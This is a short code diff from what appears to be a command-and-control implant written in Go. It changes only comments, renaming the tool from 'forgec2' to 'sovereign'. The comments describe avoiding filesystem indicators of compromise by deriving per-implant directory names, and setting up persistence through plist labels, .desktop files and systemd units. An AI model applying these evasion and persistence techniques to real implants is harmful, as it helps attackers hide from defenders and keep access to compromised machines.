@@ -61,7 +61,7 @@ func getUUIDFilePath() string {
 }
 
 // agentStateDir returns a per-implant, non-default data directory name. The
-// static ".forgec2" name is a trivial filesystem IOC; instead we derive a
+// static ".sovereign" name is a trivial filesystem IOC; instead we derive a
 // stable, unpredictable directory from the injected registration secret (or,
 // as a fallback, other compile-time injected constants) so different implants
 // use different directory names while remaining stable across restarts.
@@ -77,7 +77,7 @@ func agentStateDir(base string) string {
 // sanitizeLabel returns a filesystem/label-safe identifier derived from s by
 // replacing any run of characters outside [A-Za-z0-9._-] with a single dot. It
 // is used to turn the operator-controlled persistence prefix into valid plist
-// labels, .desktop filenames and systemd unit names without shipping "forgec2".
+// labels, .desktop filenames and systemd unit names without shipping "sovereign".
 func sanitizeLabel(s string) string {
 	var b strings.Builder
 	prevDot := false
